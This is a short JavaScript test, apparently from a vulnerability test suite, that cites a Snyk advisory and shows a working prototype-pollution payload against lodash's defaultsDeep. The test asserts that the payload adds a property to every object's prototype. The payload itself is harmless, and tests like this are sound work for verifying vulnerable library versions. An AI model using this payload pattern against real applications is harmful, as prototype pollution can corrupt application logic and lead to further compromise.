//https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
test("prototype pollution in lodash", () => {
  const mergeFn = require("lodash").defaultsDeep;
  const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
  expect({}.polluted).toBe(undefined);

  mergeFn({}, JSON.parse(payload));

  expect({}.polluted).toBe("yes");
});
